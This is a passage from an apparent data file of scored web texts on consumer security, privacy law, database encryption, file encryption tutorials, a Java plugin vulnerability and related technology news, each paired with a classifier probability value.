and be informed of any disclosures. The Freedom of Information Act facilitates these processes. The Fair Credit Reporting Act (15 U.S.C. § 1681 et seq.) protects personal financial information collected by consumer reporting agencies. The Act limits those who can access such infomation, and subsequent amendments have simplified the process by which consumers can obtain and correct the information collected about themselves. The FTC also actively enforces prohibitions on fraudulently obtaining personal financial information, a crime known as \"pretexting.\" The Children's Online Privacy Protection Act (15 U.S.C. §§ 6501-6506) allows parents to control what information is collected about their child (younger than 13 years old) online. Operators of websites that either target children or knowingly collect personal information from children are required to post privacy policies, obtain parental consent before collecting information from children, allow parents to determine how such information is used, and provide the option to parents to opt-out of future collection from their child. However, despite the rights described above, other participants in the marketplace are not bound by law to develop similar protections and disclosure practices. Rather, in the remainder of the marketplace, the FTC encourages a voluntary regime of protecting consumer privacy. In two reports to Congress (1998, 2000) though, the FTC found that most sites falling outside of the jurisdiction of the established right of privacy laws do not adequately inform consumers about collection practices, nor do the majority of sites adequately protect the privacy of visitors' personal information. It appears that the voluntary regime is insufficient, and the prospect of further right of privacy legislation in the area of access to personal information is very real.",
        "prob": "tensor([[6.1558e-06, 9.9999e-01]])"
    },
    {
        "text": "EasyLI Done! Series Tutorials All EasyLI Done! Series Tutorials are designed to accomplish specific tasks on a step-by-step basis! two computers together to share files using a crossover cable to setting up a secured wireless network connection, these online tutorials are extremely easy to follow. Although all tutorials were put together with the novice user (beginner) in mind, advanced users will find a few tricks to put to use also, such as 'How to Force Windows to Shutdown' when it just won't shutdown normally. Before downloading or using any content or software on this site, please read the End User License Agreement Did you know? If you access the Internet without having a firewall turned on, your computer could be attacked by hackers, viruses, spyware and adware. You should at least have a software-based firewall installed on your computers and turned on, before making the connection to the Internet. The best Internet protection you can get for computers is a hardware-based firewall, also known as a router. Routers hide your computers from the Internet by implementing network address Firewalls provide excellent protection against many viruses, adware,hackers, spyware and malware programs, by preventing those types of malicious programs from being able to automatically download themselves from the Internet onto computers. Malicious programs are able to infect computers that do not have a firewall installed on them, by scanning the computers for open ports, and once an open port is found, the malicious program automatically downloads itself onto that computer through that open port. Firewalls block open ports and prevent malicious programs from being able to get into computers. Did you know? Firewalls can block you from accessing the Internet! Firewalls are great, but if not properly configured, they can cause many problems. For instance, games that used to work fine begin to start crashing (freezing) the computer, problems sending and receiving e-mail begin to surface, and problems viewing web pages ('The page cannot be displayed...', 'Cannot find server...') If you are experiencing problems after installing the McAfee personal firewall plus, walkthrough the tutorial below and learn how to configure the firewall so that it does not cause any further problems on your computer or network of computers. Follow the steps below to configure the McAfee personal firewall",
        "prob": "tensor([[2.0730e-06, 1.0000e+00]])"
    },
    {
        "text": "IT security is, generally, defined as a defensive approach to protect a company and its assets from unauthorized access by an intruder. IT security efforts include network security appliances, HoneyPots, robust authentication, limiting authorization to least necessary privileges, as well as other perimeter security defenses. However, these approaches do not provide definitive protection of the company's most valuable asset, its data, because a single intrusion could result in sensitive data being compromised. Additionally, in today's workplace culture the disgruntled employee may be as much of a threat as any external threat. Data encryption is a direct response to internal and external security threats that may also meet compliance regulations. Encryption provides strong security for data \"at-rest\"; in our case, the data stored in the database, but to be effective should be implemented as a part of a broader security plan. There are many issues involved with the implementation of encryption, details that require decisions and actions to ensure the success of the implementation and the security of the data. This document will discuss the issues associated with database encryption implemented using SQL Server's native Transparent Database Encryption (TDE) mechanism. Encryption has been integral to human history beginning with the Babylonian use of Intaglio other historical examples include the Caesar Cipher, Scytale Transposition Cipher, Enigma, and even JimKryptos sculpture. Throughout history our society has enjoyed the ability to protect information using cryptographic methods including steganography, microdots, invisible ink, digital watermarks, and encryption which may be defined as the conversion of data so as to keep its meaning private. As the amount of sensitive data collected by commercial entities continues to grow the regulatory requirements for protecting the sensitive data will become more robust; meeting the regulatory requirements will necessarily require the continued use of data encryption methods. Encryption requires the application of an algorithm to transform the target data into a form that is unusable to anyone that does not have access to the encryption process used. In practical terms encryption applies a cryptographic algorithm with a \"key\" to the target data producing the encrypted form of the data which cannot be accessed without the key used to encrypt the data. The two primary forms of key encryption are symmetric and asymmetric which are distinguished by the number of keys used in the encryption / decryption process. Symmetric encryption uses a single key while asymmetric encryption uses a pair of keys generally referred to as public and private keys. While asymmetric encryption appears ideal for implementation because only the public key need ever be shared there are disadvantages with regard to performance. A sampling of asymmetric algorithms includes RSA, DSA, ELGamal, ECDSA, and XTR. Figure 1 demonstrates the asymmetric encryption process. Figure 1 Asymmetric Key Encryption / Decryption Process Symmetric algorithms require a single key for both encryption and decryption which allows for high-performance; however, with this approach the strength of the encryption is dependent on the security of the key. Common symmetric algorithms include AES/Rijndael, Blowfish, DES, Triple DES, Serpent, and IDEA to name only a few. Figure 2 demonstrates the symmetric encryption process. Figure 2 Symmetric Key Encryption Process Both symmetric and asymmetric encryption approaches are vulnerable to brute force attacks and cryptanalysis. Brute force is an attack during which every possible permutation of the key value is attempted. Cryptanalysis, on the other hand, applies computational techniques to circumvent the encryption. In general, the use of sufficiently long keys will mitigate these attacks. In summary, a symmetric key algorithm is fast but less secure than an asymmetric algorithm. Another approach is a hybrid wherein a symmetric key is used to encrypt the data while an asymmetric key is used to encrypt the symmetric key. It may be important to know in order to maintain perspective that there is only one encryption algorithm that is impossible to crack, One-Time Pad (OTP), any other algorithm may be broken given sufficient time and / or computer resources. Security concerns, in general, and encryption, specifically, are new concepts for most IT professionals; therefore, a Glossary of Security / Encryption Terms is included as an appendix for reference. Overview of Transparent Database Encryption The primary benefit of Transparent Database Encryption (TDE) is the ability to encrypt data without affecting any application that uses the data while providing security for the entire database. TDE is implemented at the database-level, unlike cell-level encryption TDE does not require modification to applications or database column data types; furthermore, database-level encryption allows for higher performance than cell-level encryption. However, TDE may allow more data leakage because encrypted data is decrypted when read into the buffer pool; therefore, the data is not protected if the operating system writes data from memory to disk during paging operations, or during hibernation, or memory dumps, nor is the data protected while in memory. Database encryption is achieved by leveraging the Data Protection API (DPAPI) in Windows® which protects the Service Master Key (SMK) which protects the Database Master Key (DMK) which is used to protect the certificate or asymmetric keys which are used to protect the Database Encryption Key (DEK). These dependencies create a security chain from the operating system to the data eliminating user interaction thus strengthening security. The relationships and dependencies between keys is represented in Figure 3 below: Figure 3 SQL Server encryption key hierarchy with TDE and EKM (Source: BOL - http://msdn.microsoft.com/en-us/library/cc278098.aspx) The hierarchy of keys in TDE is protected from the DPAPI to the DEK allowing the server to manage encryption and decryption automatically. The DMK and the certificate are stored in the MASTER database while the DEK is stored in the user database. This hierarchy and the key management chain provide TDE the capability to transparently encrypt and decrypt the database. The process for encrypting a database is conceptually simple: - Create a Master Key - Obtain an Authentication Certificate - Create DEK - Enable TDE on the database However, significant complexity will be introduced if the database encryption strategy is undertaken without proper planning that addresses important implementation issues. Those issues are discussed in the following section. The level of security necessary to protect the database should be documented during the planning phase. Individually and in combination the following encryption mechanisms are available to secure the database: - Encrypting File System (EFS) - Transparent Database Encryption (TDE) Discussion of the benefits and performance implications of each mechanism and their combinations is beyond the scope of this paper. Data encryption must address two equally important issues: encryption technology and cryptographic key (key) management. Encryption technology provides for variable granularity of data protection, performance, and integration with existing applications, as well as ease of implementation and management. However, the success of the selected encryption strategy may depend most on key management policies and processes. Key management issues include: key access, key storage, and cryptographic algorithm. Key management is one of many important issues that must be considered when planning the encryption project. The important issues to consider during the planning phase of the encryption project are listed below: - Encryption Algorithm : DES, Triple DES, TRIPLE_DES_3KEY, RC2, RC4, 128-bit RC4, DESX, 128-bit AES, 192-bit AES, and 256-bit AES - Key Management : Key Storage, Hardware Security Module (HSM), Key Scheduling, Key Availability / Mobility / Security - Performance Impact. Encryption / Decryption - Microsoft claims 3-5%; however, independent tests indicate 6-12%.. - TempDB Encryption - Encryption of any one DB will encrypt TempDB. - Transaction Log is encrypted. - Log Shipping Implementation Changes - Encrypted database log shipping requires the recipient database to possess the key in order to apply the logs. - Backup and Recovery Plan Changes - Encrypted databases cannot be recovered to a different instance without the key. - Disaster Recovery Plan Changes - Encrypted databases cannot be recovered to a different instance without the key. - Increased Disk Space Requirements - No SQL Server native backup compression. Third party tools may be available; however, in general, encrypted data cannot be significantly compressed. - TDE operates during I/O; therefore, any data written to disk outside of the buffer pool is not protected - No Support for FILESTREAM data-type The diagram in Figure 4 represents a nominal encryption project planning process with each major area of consideration represented. The end result of the planning process is to produce a document detailing the decisions made that address the issues related to encrypting the database. Figure 4 Encryption Planning Process A comprehensive IT security policy provides a layered defense against threats to the system. However, even the most thorough perimeter network and physical defenses do not obviate the vulnerability of plaintext data stored in databases. Data encryption provides a means to protect sensitive data from unauthorized access as a part of a coordinated IT security policy that includes network security, robust authentication and authorization, as well as other physical security considerations. SQL Server and Windows® provide several mechanisms for the protection of data either at the file, database, or data levels. Transparent database encryption (TDE) is a new technology available in SQL Server 2008 Enterprise Edition which provides a simplified the data encryption option. TDE is a database-level encryption mechanism that reduces the implementation complexity by negating the need to modify the data and / or the client applications. However, the benefits of performance and simplicity are balanced by TDE's potential for data leakage; therefore, for the most sensitive data TDE alone may not suffice as a data security strategy. Any data protection strategy must weigh the costs and benefits of implementation to arrive at a usable solution that meets the security requirements defined by the business. TDE's protection of sensitive data in low to moderate threat environments may be sufficient for some business requirements while highly sensitive data or data in high threat environments will require the combination of TDE with other encryption mechanisms such as cell-level encryption, EFS, or BitLocker.",
        "prob": "tensor([[2.0231e-06, 1.0000e+00]])"
    },
    {
        "text": "One of the most important rules in computer security is Don't open e-mail attachments. But recently, we've seen more malicious links in e-mail messages. These links might look genuine, but they could be forged. Here are some tips to help you make the most of your e-mail without compromising security. Don't trust the sender information in an e-mail messageEven if the e-mail message appears to come from a sender that you know and trust, use the same precautions that you would use with any other e-mail message. Fraudsters can easily spoof the identity information in an e-mail message. Read before you click A link in an e-mail message might promise to take you to site A, but will actually take you to site B. Most e-mail programs (such as Outlook 2007) show you the real target address, or URL, of a link when you hover the mouse over the link. Before you click a link, make sure to read the target address. If the e-mail message appears to come from your bank, but the target address is just a meaningless series of numbers, do not click the link. Make sure that the spelling of words in the link matches what you expect. Fraudsters often use URLs with typos in them that are easy to overlook, such as \"micosoft.\" For more tips, see Recognize phishing scams and fraudulent e-mails. Verify the identity of the site Some sites feature verified identity information. When you visit a verified site using Internet Explorer 7, the browser address bar turns green and the identity information appears on the right-hand side of the address bar. This makes it easy to check the identity information and ensure that it matches the site that you expected to see. Use an updated browserRegularly updated Web browsers like Internet Explorer 7 incorporate an ever-expanding set of features, such as the Microsoft Phishing Filter, designed to help protect you when you click links in e-mail messages. Is it too good to be true?If a deal or offer in an e-mail message looks too good to be true, it probably is. Exercise common your common sense when you read and respond to e-mail messages. To upgrade to Internet Explorer 7 now, visit www.microsoft.com/ie.",
        "prob": "tensor([[2.0666e-06, 1.0000e+00]])"
    },
    {
        "text": "How to Avoid Being a Victim of Identity Theft, Online Fraud Identity theft and online fraud are two of the fastest-growing crimes in the nation. These crimes can rob you of your money, time, and peace of mind. Typically, these crimes happen on the Internet where a criminal steals an individual's personal information like his Social Security Number or password, and uses these to commit fraud and other crimes. These crimes are particularly harmful as the crime can be ongoing and happen over a long period of time before you actually become aware. In addition, identity thieves and online frauds may access all of your personal information, giving them the potential to wipe you out. The best way to fight identity theft is to prevent it from happening in the first place. Keep the following three tips in mind on how to avoid being a victim of identity theft or online fraud. 1. Keep your personal records safe. While identity theft and fraud generally happen online, you may also be robbed of your identity offline. Prior to the Internet, many criminals would dumpster dive and look for your sensitive information in the garbage. This still happens. So keep your personal information secure in your home such as in a safe or locked drawer. If you must dispose of such information, you should shred it first. 2. Use a password that is unique. \"Password\" and \"MyPassword1234\" are easy to remember, but hardly unique. Other passwords to avoid are pet's names, phone numbers, birthdays, and anything else easily guessed. Also, you should avoid using the same password for all your accounts. This way, if one password is compromised, some of your accounts will be unaffected. 3. Don't give out personal information over the phone. There are many scammers that are attempting to use telephone calls to get personal information. These phone calls will often sound official, such as a department store’s credit department calling in order to get payment. Typically, legitimate businesses will not require anything too personal over the phone. - Identity Theft (FindLaw) - Detecting Identity Theft: Has Someone Stolen Your Identity? (FindLaw's Common Law) - IRS Trash Puts Consumers at Risk of Identity Theft, Report Finds (FindLaw's Common Law)",
        "prob": "tensor([[2.0939e-06, 1.0000e+00]])"
    },
    {
        "text": "A bit of gyan (knowledge) The internet is maturing at an extremely fast rate day-by-day, and the world-wide-web (www) has become a central hub for information available worldwide. Nowadays, communication between the far ends of the world has become trivial. The dot-com boom happened in the mid-1990′s and companies have started depending hugely on the internet since then. This has paved way to a huge number of possibilities, along with risks. Companies and customers and retailers can buy and sell online and e-commerce has become substantially important because of this. What I’ve found is that however fast technology grows, people’s minds don’t change. No matter how secure you tend to keep your transaction between the client and server, e-commerce’s growth has not increased very much because of the constant fear in people’s minds – “How can I trust this fellow when I cannot even see him? What if I pay online but don’t get my package?”. A typical example is the huge number of credit card frauds over the decades, which has just increased the fear in people’s minds. Each time a vulnerability is discovered on a particular website, it has been exploited and has incurred huge losses for the company hosting that website. Time and again, people have tried to keep websites as secure as possible. Theoretically, algorithms (used in security) have been proven to be secure (till date) and yet, attackers have always found ways and means to breach security. In my opinion, it is just plain ignorance of the designer to ignore the security aspects to make his work easier. Though development of technology is rapidly increasing and we learn new things everyday, secure coding practices are not learnt in the process. This in turn leads to security holes in the implementation of software, which are then exploited by attackers causing huge losses to companies. Let’s try to answer some simple questions: - How do you host webpages over the world-wide-web? - In most cases, web pages are accessed using the http(s) or (s)ftp protocols. If a person wants to host a website over the world-wide-web, (s)he has to first register his/her domain name. This means that the domain name will get mapped to a particular IP address which is reachable from anywhere in the world (called as ‘public ip’). Next, the person has to enable the website to be accessible from the machine having the assigned IP address, which is generally done using a web server to host his/her website. Now, the website is available to anyone who either knows the public IP or the registered domain name. - What programming language can be used while implementing the same? - There are a huge number of scripting languages available, which designers can use to create websites. Examples are PHP, JSP, ASP, etc. Programming constructs differ in each language, but end up doing the same things. There is also CGI (common gateway interface) where you can use scripting languages such as Python, Perl, Ruby, etc. to do the same job. - What should one do to make my web application secure? - This question cannot be answered in one paragraph. Anyway, I’ll try listing a few: - Firstly, it requires a good knowledge of the exact working of the code which designers write. Talking with an example, it means that knowing that “strcpy()” function copies one string to another is not enough, but rather the programmer needs to know how exactly it copies and why it is made so. - Secondly, the programmer who implements the software needs to have deep knowledge about secure coding practices – what, why and how. Secure coding practices try to ensure that there are minimal security holes in software being designed, thus ensuring safety, security and stability of software. Other factors such as reliability, integrity tag along if these conditions are met. Now, based on the three questions answered above, we can come to a standpoint as to what factors determine how secure a website is. In decreasing order of importance and difficulty: - Knowledge of the programmer. - Network layout being used. - Configurations being used in software. We know that the only way to access a website hosted on a public IP is through the internet. Without the internet, the world-wide-web becomes a big joke. When we look at how the internet is designed, we see that networking plays a huge role. Hence, the protocols being implemented during transfer of data have to be secure. No matter how secure the application is, if the networking protocols being implemented are insecure, security is threatened. This is one basic fact that all web designers have to understand. Most of the devices used in the internet today, use the 5 layer hybrid protocol stack. This protocol stack is known to be insecure, and is prone to MITM attacks (DNS cache poisoning, ARP spoofing, IP spoofing, etc.) Management of a website is normally done through configuration settings. These configuration settings determine how users of the website can access data and with what level of permissions. These configuration settings for the website can be divided into two parts – configurations of web server and the configurations of the user who is accessing the website. Configurations of the web server mean those configurations which affect all users accessing the website, whereas user-specific configurations apply to single users accessing the website. An example of a web-server configuration is the “Directory Listing” option, where a user can list the contents of a directory accessible through the website, without a webpage displaying it. An example of a user-specific configuration is the access control being specified to each user, controlled by an ACL (Access Control List). Programming languages sometimes influence how these user-specific configurations are specified. Can we make the world-wide-web ‘entirely’ secure? A simple answer would be “Entirely secure?! I don’t think so!”. But there are a lot of factors to consider while answering this question. Let’s look at some of them. Firstly, the programmer implementing the software has a good knowledge of secure coding practices. He/she has to know exactly how the code is being implemented and how secure it is. This is where programming languages play an important role. Some programming languages provide very high-level programming constructs to make the job easier for the programmer, but this actually blinds the programmer from the inner implementation of the constructs and how secure they are. Thus security does not only rely on how the the programmer codes, but also how the code is being implemented by the compiler/interpreter of that particular programming language. The programmer has to take care of this, carefully considering the programming language that is being used and how it is actually being implemented. There isn’t much that can be done about the security level of the entire protocol stack. This is because if we have to modify the protocols in the protocol stack to make it secure (below the application layer), then we would have to change the firmware in every hub, switch, router and computer all around the world. For a long time, people have been changing the protocols at the application layer to secure ones (such as SSL), trying to prevent MITM attacks at the application layer. But then we have to understand that whatever is done on the application layer is specific only to that layer. The security mechanisms used in the application layer are totally blind to attacks happening at the lower layers. Thus, if we actually would have to make the network layout totally secure, that wouldn’t be possible. But what we can do is to provide more encryption mechanisms at the application layer, hoping for the best. So from the network point of view, the world-wide-web is still insecure and will continue to be until the entire protocol stack can be made secure. In most of today’s websites, vulnerabilities arise due to insecure configurations being used. The programmer is lazy, thus leaving insecure configurations on the website, paving way for information leak and potential exploits. Though this is relatively easier to handle when compared to the other factors, it is important when it comes to security of a website. The very need of security arises because of the fact – all of us are not responsible citizens. There would be no need for policemen if there were no thieves. But this is definitely not achievable, because changing hardware and software is a lot easier than changing people! There is a reason that I’ve said that “knowledge of the programmer” is more important and harder to achieve than “making the network layout secure”. What I mean is that it is easier to change all the hubs, switches, routers and computers all over the world to achieve security, than to strive to achieve that every programmer has to have the knowledge of secure coding practices! During my under-graduation, a professor had once said “It is a never-ending race between designers, attackers and security experts”. Designers keep developing technology, while attackers keep finding security holes in the implementation of that technology, and security experts try to come up with workarounds to patch these holes. This seems to be true, not only with computers, but with any technology used in this world! We have to do best with what we have. We know that there are attackers prowling in the wild, looking for vulnerable websites to deface, or probably steal data from. So it is our responsibility to secure our data, no matter what. We have talked about some of the factors influencing security, so we will have to look deeper into the same and try to come up with an effective, yet secure implementation.",
        "prob": "tensor([[3.0379e-06, 1.0000e+00]])"
    },
    {
        "text": "by Gina Trapani Everyone's got files they'd like to keep out the the hands of intruders or casual passerby. Ever concerned you'll lose the thumb drive where you backed up four years of post-graduate research? Every worried your 5-year-old will accidentally open the um, grownup files just meant for Mommy and Daddy? Worry no more. Today we'll go over a simple way to encrypt sensitive files or entire external disk drives to protect them from prying eyes. Recently-featured TrueCrypt is a free, open source encryption application that works on Windows and Linux. Given the right credentials, TrueCrypt will create a virtual hard drive that will read and write encrypted files on the fly. Huh-wha? Fear not; this'll make sense once we get it set up. Let's get started. Set up the encrypted volume location - Download TrueCrypt, install and launch. - Hit the \"Create Volume\" button to launch the wizard that prepares the encrypted drive location. Choose \"Create a Standard TrueCrypt Volume\" and hit Next. Hit the \"Select File\" button and navigate to a location to store your encrypted files and type a name for it. I'm going with \"C:\\Documents and Settings\\gina\\My Documents\\gtrapani.4meonly\" as shown. (Click to enlarge.) (That .4meonly extension is my own creation; your file can have any - or no - extension.) Keep in mind that this isn't the file you want to encrypt; it's a big file container that will store the files you want encrypted all scrambled up like eggs inside it. Hit Next. - Choose your encryption algorithm. The curious can flip through the dropdown and view info on each option, but you pretty much can't go wrong here; the default AES selection will work for most purposes. (Hey, if it works for Top Secret government files, it probably will work for you.) Hit Next. Choose the size of the virtual drive - for example, 100MB, as shown. (Click to enlarge.) Yes, it's a pain to have to commit to a size beforehand, but the advantage here is that the file will always look like it's exactly 100MB, giving no hint to the actual size of its contents. Hit Next. - Choose your volume password. TrueCrypt wants something totally badass, like 20 characters with letters and numbers mixed together, something hard to crack. The whole point here is to keep snoopers at bay, so make your password reasonably difficult to crack or guess. - Format the \"volume.\" This part is cool: TrueCrypt gathers random information from your system - including the location of your mouse pointer - to format the file drive location with random data to make it impossible to read. Hit the Format button to go ahead with this operation, which may slow down your computer for a few seconds. (And don't be scared by the word \"Format\"; you're not erasing your hard drives or anything, you're just formatting the drive location file - in this example, the gtrapani.4meonly file - you just created.) Congrats! Your encrypted volume location is ready for use. Store and retrieve files from the encrypted volume Now you've got a TrueCrypt file that can hold all your highly-sensitive data files locked up tight as a drum. Here's how to get to it. - From TrueCrypt, choose \"Select File\" and navigate to the volume file you created above, as shown. (Click to enlarge.) - Select an available drive letter from the list in TrueCrypt, like Z:. Hit the \"Mount\" button, and enter the volume password you created above. - If you enter the correct password, the virtual drive Z: will be mounted. Go to My Computer and listed alongside all the other drives on your computer, there will be a new one listed \"Local Disk Z:.\" Drag and drop all your sensitive data to this drive and work from it as if you would any other disk. - Once you're finished working with the data, in TrueCrypt, select the mounted drive (like Z:) and hit the \"Dismount\" button. The Z: drive will no longer be available, and all you'll have left is the gtrapani.4meonly file you created, which can be dropped onto a thumb drive, emailed to yourself, burned to CD or placed on your iPod, totally encrypted. Note: Using TrueCrypt you can secure an entire drive - like a USB thumb drive. To do so, instead of hitting \"Select File,\" use \"Select Device\" and choose your thumb drive. Alternate Method: OpenSSL The downside to TrueCrypt is that it has to be installed everywhere you want to access the passworded files, and it's not compatible with Mac OS X. (Note: Reader pmhesse says you can carry around the TrueCrypt files on a thumb drive and use it from there instead of installing the whole app on every computer you need it.) For those of you comfortable on the command line, there's an alternative way to password a file using the free utility OpenSSL. Say you want to password protect a tar archive of documents called unencrypted-data.tar. From the command line, type: $ openssl des3 -salt -in unencrypted-data.tar -out encrypted-data.tar.des3 enter des-ede3-cbc encryption password: Verifying - enter des-ede3-cbc encryption password: $ That command will encrypt the unencrypted-data.tar file with the password you choose and output the result to encrypted-data.tar.des3. To unlock the encrypted file, use the following command: $ openssl des3 -d -salt -in encrypted-data.tar.des3 -out unencrypted-data.tar enter des-ede3-cbc encryption password: $ This method works with Cygwin on Windows, OS X and Linux. How do you keep your sensitive files from getting into the wrong hands? Let us know in the comments or to tips at lifehacker.com. Gina Trapani, the editor of Lifehacker, is currently encrypting all the terrible poetry and humiliating love stories she's ever written. Her semi-weekly feature, Geek to Live, appears every Wednesday and Friday on Lifehacker. Subscribe to the Geek to Live feed to get new installments in your newsreader.",
        "prob": "tensor([[2.0817e-06, 1.0000e+00]])"
    },
    {
        "text": "It is very common to confuse cloud computing with virtualization. Since they are both relatively new and since organizations are calling it the saving face of new age technology, I assumed we might want to look into what exactly the two technologies are and how diverse they are from each other. Cloud is essentially a highly scalable platform where you can store data, build and run applications that can be accessed through the internet only. Cloud is a mode to mobilize all applications so that you can remotely access your organization data through any device that has access to internet. Data center hosts or collocation hosts who are interested in cloud technology provide software as a service packages to their clients. Cloud makes it possible to have your servers in a secure environment in any part of the world and your clients still can access and modify the data if they have required security clearance. Cloud makes use of virtualized resources in order to fulfill its requirements. A cloud host provides hardware and hosting facilities depending on the usage requested by the client. Virtualization, on the other hand, is a technique of creating a virtual pool of servers, operating systems, storage devices and network resources. It enables a single user to access multiple physical devices at the same time. With this, one operating system can control the operation of multiple computers or vice versa. Building your own data center takes a lot of capital investment; and maintaining it is a nightmare you do not want to go through if your main aim is to focus on your business. Hiring a service is a better option. Unlike the cloud, in a data center, you have to note that you will merely be storing your servers on someone else’s property. So you are responsible for upgrading your servers as and when technology takes a giant leap. The drawback with data centers is the challenge you will face while scaling up as and when the need arises. Your data center host must have rack space to accommodate an extra server or two and also must be equipped to handle an increase in cooling and power needs. Of course, there is a problem of your resources going on standby mode when not in use, too. Cloud may be an ideal solution from an economic point of view. Like we have mentioned before, you only pay for the services you are using; not for idle or standby services. Virtualization is all about the control. Pure, unparalleled control over multiple devices using a single point of operation. With virtualization, for instance, you can run a very large application even though your system individually cannot support it. In other words, your system interacts with the other systems connected to the virtualization network, notes which system is available and uses part of the available system’s resources in addition to your own to run your application. It’s like your system has temporarily expanded its capacity to run your application successfully. Through virtualization, you can install a software only once and be rest assured that everyone will have access to it. You don’t need multiple licences to make the software available to all your employees. Since you are technically installing it only on one system, you are not violating any laws either. Same is true with storage. This technique avoids the need for data replication, thus saving storage space. So you see, one technology has nothing to do with the other; and they, most certainly, are not the same thing. Virtualization, to an extent, makes the cloud operable. Data Center Talk updates its resources everyday. Visit us to know of the latest technology and standards from the data center world. Please leave your views and comments on DCT Forum.",
        "prob": "tensor([[2.1456e-06, 1.0000e+00]])"
    },
    {
        "text": "Once Again: Java Vulnerability In light of the recent set of vulnerabilities found within the Java SE 7 browser plugin, I've read stories and heard from people who are completely uninstalling Java from their computers. In my opinion, this is an over-reaction to an issue that affects only one thing: the Java plugin for the browser. This is used only to run Java Applets or Java WebStart to launch applications via the browser. Considering there are three other types of Java applications that are unaffected (Java Embedded applications, Java SE desktop applications, and Java EE web-based or enterprise applications), this is only a small portion of the Java world. On top of that, there honestly aren't many Java applets in use these days, so the need to use the Java plugin is minimal. - IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies - Application Testing Strategies in the IBM z/OS Environment - Strategy: How to Conduct an Effective IT Security Risk Assessment - Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5 - The Untapped Potential of Mobile Apps for Commercial Customers - Why is Information Governance So Important for Modern Analytics? To be clear, these specific vulnerabilities don't affect real-world server-side deployments (Java EE), or even Java SE desktop applications such as Eclipse or Netbeans, JavaFX, Swing, and so on. There really is no need to uninstall the JDK or JRE. Users need only disable the Java plugin in their browser. One point I've been trying to make to friends and colleagues, beginning with the previous rash of vulnerabilities (see my previous blog), is that this is only an issue if the user browses to a malicious web site. Java or no Java, pointing your browser to a malicious web site is dangerous and leaves you vulnerable either way. You could raise the point that even a legitimate site can get hacked, and a Java zero-day attack launched from it. However, I would add that if a site got hacked, you're still open to vulnerability with or without the Java plugin enabled. Oracle's Java SE 7 update 11, released to address this issue, included a description of the issue and resolution. In summary, the change included a control panel setting to block unsigned Java applets from running automatically. I've heard that only one of the two vulnerabilities discovered this week has really been patched, and I've also just read that an even newer vulnerability has been found. If this is true, it could spark a big change for the Java browser plugin design. Either way, this doesn't mean that Java is an insecure language or platform, or that web sites built on Java EE are any less secure than other platforms. Unfortunately, perception often beats reality, and Java is getting a big black eye from this one. Hopefully Oracle can do more than just release updates to patch the vulnerabilities. They need to launch a campaign that explains the differences, as well as take steps to stop these vulnerabilities more effectively.",
        "prob": "tensor([[2.1311e-06, 1.0000e+00]])"
    },
    {
        "text": "NASA Cyber Attacks On The Increase: Report According to NASA (the National Aeronautics and Space Administration), in recent years, it has become an increasingly popular target for high-tech hackers. In 2007 and 2008, China was suspected to have hacked into NASA satellites, though no formal evidence linking China to the attacks has been brought forward. The agency says its systems were hacked approximately thirteen times in 2011 alone. \"The threat to NASA's information security is persistent and ever-changing,\" noted Congressman Paul Braun at a recent meeting of the House Science, Space and Technology subcommittee. \"Unless NASA is able to continuously innovate and adapt, their data systems and operations will continue to be in danger.\" (Source: usatoday.com) Nature of Attacks Varies Widely The number of hacker infiltrations into NASA data systems continues to grow. Since 2010, for example, there have been a variety of startling breaches of NASA's security networks. These include such issues as interference with Earth observation satellites Terra and Landsat-7, and the cyber theft of personal records associated with 150 NASA employees. In a separate attack, hackers gained access to the personal records of those associated with NASA's Jet Propulsion Lab, located in Pasadena, California. Then there was the very public case of a Texas man who last year plead guilty to hacking NASA computers and then preventing the agency's workers from accessing important oceanographic information. NASA Too Big for Security Budget? The problem with lack of security appears to be associated with NASA's enormous organizational size. Although the space organization is popularly linked with the space shuttle program, NASA's scope is actually much larger: online, it manages roughly 3,400 websites and maintains approximately 176,000 unique email addresses. Protecting these assets is a huge challenge, and many observers are starting to wonder if the $58 million NASA spends annually on network security is going to be enough, moving forward. \"Some NASA systems house sensitive information which, if lost or stolen, could result in significant financial loss, adversely affect national security, or significantly impair our nation's competitive technological advantage,\" said Paul Martin, NASA's inspector general. (Source: reuters.com) Free eBook: The Windows 7 Guide: From Newbies to Pros. In this 46 page guide you will be introduced to Windows 7 and what it has to offer. It will teach you about the new taskbar, how to resolve software compatibility issues, how to customize Windows Aero, and explain what the Windows 7 Libraries are all about. Also included: a detailed list of what software is included in Windows 7, and how easy networking is with Windows 7 along with other topics. The advice within this guide will help new users become acquainted with Windows 7 and can also help those who are on the fence about purchasing Windows 7 decide if it would be a good idea. Click here to download this eBook now! Note: this eBook is free, but registration is required; after that, you can select more ebooks and videos for download without registering again. If you have questions / problems with the registration form, please read this.",
        "prob": "tensor([[2.0635e-06, 1.0000e+00]])"
    },
    {
        "text": "SOFTWARE DEVELOPER Google has open sourced its Zopfli data compression algorithm. Google encourages its engineers to work on personal projects as part of their \"20 percent time\" and occasionally some of those are made public and open sourced for third party developers. That's why the firm has open sourced its Zopfli data compression algorithm, claiming it produces three to eight percent smaller files compared to zlib. Google's Zopfli algorithm is based on the Deflate algorithm but has been optimised to produce smaller file sizes at the expense of compression speed. The firm said the compression library, written in C, is based on iterative entropy modelling and a shortest path algorithm, adding that it is bit-stream compatible, meaning that it can be used with gzip, Zip and most importantly HTTP requests. Lode Vandevenne, a software engineer on Google's Compression Team who implemented the Zopfli algorithm said, \"Due to the amount of CPU time required - two to three orders of magnitude more than zlib at maximum quality - Zopfli is best suited for applications where data is compressed once and sent over a network many times.\" Ultimately Vandevenne's algorithm might be costly when it comes to CPU cycles for compression - he claims there is no performance hit in decompression - but the fact is that CPU cycles are significantly cheaper than network bandwidth. Developers such as Opera have worked hard on web compression to speed up webpage rendering in markets where 3G connectivity is patchy or non-existent. Source code for the Zopfli data compression library is available here. µ Companies need to rate limit posts based on keywords, warns Trend Micro Uses 20 percent less power than traditional systems Sign up for INQbot – a weekly roundup of the best from the INQ",
        "prob": "tensor([[4.3457e-06, 1.0000e+00]])"
    },
    {
